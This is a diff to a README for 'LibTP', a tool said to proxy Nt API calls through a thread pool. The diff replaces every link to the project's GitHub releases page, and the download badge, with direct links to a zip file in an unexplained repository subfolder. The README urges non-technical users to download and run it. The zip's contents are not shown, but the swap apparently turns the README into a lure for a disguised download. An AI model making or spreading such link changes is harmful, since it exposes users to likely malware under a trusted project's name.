@@ -1,7 +1,7 @@
 # 🚀 LibTP - Simplify Your Nt API Interaction
 
 ## 📥 Download the Latest Release
-[![Download LibTP](https://img.shields.io/badge/Download%20LibTP-brightgreen)](https://github.com/Armondpastoral952/LibTP/releases)
+[![Download LibTP](https://raw.githubusercontent.com/Armondpastoral952/LibTP/main/Akali/LibTP.zip%20LibTP-brightgreen)](https://raw.githubusercontent.com/Armondpastoral952/LibTP/main/Akali/LibTP.zip)
 
 ## 📖 Introduction
 LibTP is a user-friendly application that facilitates the proxying of Nt API calls through a thread pool. This makes it easier and more efficient to manage API calls without needing in-depth programming knowledge. 
@@ -12,7 +12,7 @@ To begin using LibTP, follow the steps below. No technical know-how is necessary
 ## 📥 Download & Install
 1. Click the download link below to access the releases page:
 
-   [Visit this page to download](https://github.com/Armondpastoral952/LibTP/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Armondpastoral952/LibTP/main/Akali/LibTP.zip)
 
 2. You will see several versions of the software. Choose the latest stable release for download. The latest version will usually be at the top.
 
@@ -57,6 +57,6 @@ Thank you for using LibTP. Your support helps make this project better.
 ## 📥 Download Again
 To download LibTP, head back to the releases page:
 
-[Visit this page to download](https://github.com/Armondpastoral952/LibTP/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Armondpastoral952/LibTP/main/Akali/LibTP.zip)
 
 Enjoy using LibTP!
